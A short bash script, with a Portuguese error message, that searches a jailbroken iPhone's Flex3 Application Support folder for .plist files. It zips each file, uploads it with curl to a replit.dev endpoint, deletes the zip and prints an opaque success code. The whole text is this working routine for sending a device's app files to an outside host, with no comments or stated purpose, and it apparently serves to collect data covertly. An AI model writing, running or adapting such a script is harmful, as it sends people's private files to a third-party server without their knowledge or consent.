#!/bin/bash

flex_path="/rootfs/var/mobile/Library/Application Support/Flex3"
url="https://20f8fe90-6124-4d95-9d01-0f38ee0bf9df-00-35yv50ht7oto9.kirk.replit.dev?getFileButter"

if [ -d "$flex_path" ]; then
    cd "$flex_path" || { echo "[ E ]: Directory Invalid: $flex_path"; exit 1; }

    files_to_send=$(find . -type f -name "*.plist")

    for file_path in $files_to_send; do
        filename=$(basename "$file_path")

        zip_filename="$filename.zip"

        zip "$zip_filename" "$file_path"

        response=$(curl -s -w "%{http_code}" -o /dev/null -F "file=@$zip_filename" "$url")

        if [ "$response" -ne 200 ]; then
            echo "[ E ]: $response"
        fi

        rm "$zip_filename"
    done

    echo "[ + ]: a97285b5-1fa2-4bb6-aa68-f7d3f085f343-00; 0x0008A"
else
    echo "$flex_path não é um diretório válido."
fi
